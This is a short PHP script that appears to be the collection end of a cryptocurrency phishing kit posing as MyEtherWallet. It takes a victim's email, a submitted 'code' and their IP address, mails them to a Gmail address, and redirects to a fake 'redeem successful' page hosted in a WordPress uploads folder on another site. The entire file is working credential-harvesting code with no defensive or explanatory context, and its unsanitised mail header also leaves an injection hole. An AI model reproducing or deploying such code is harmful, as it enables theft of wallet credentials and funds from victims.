<?php
$email = $_POST['email'];
$code = $_POST['code'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];

$formcontent=" User: $email \n $code \n  ip: $ip";
$recipient = "trend.salevip@gmail.com";
$subject = "cui";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='http://fresta.vn/wp-content/uploads/myetherwallet.com/view-wallet-info-your-redeem-bilibitcoin-token-successfully.htm'> Return Home</a>";
header("Location: http://fresta.vn/wp-content/uploads/myetherwallet.com/view-wallet-info-your-redeem-bilibitcoin-token-successfully.htm");
?>
